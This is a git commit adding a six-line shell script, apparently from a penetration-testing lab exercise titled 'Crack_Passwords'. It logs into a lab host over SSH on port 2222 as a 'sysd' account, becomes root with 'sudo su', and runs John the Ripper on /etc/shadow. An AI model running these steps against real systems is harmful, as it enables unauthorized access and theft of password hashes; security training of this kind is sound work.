ff87db1129140c52d1e209f6bdde5d64e5441359
Doriane Feinstein <73500140+dorianeSF@users.noreply.github.com>
2021-03-11 21:48:58 -0500

    Create Step4.sh

---
+++ 4-Crack_Passwords/Step4.sh
@@ -0,0 +1,6 @@
+# SSH back to the system using your sysd account and port 2222:
+ssh sysd@192.168.6.105 -p 2222
+# Escalate your privileges to the root user:
+sudo su
+# Use John to crack the entire /etc/shadow file:
+john /etc/shadow
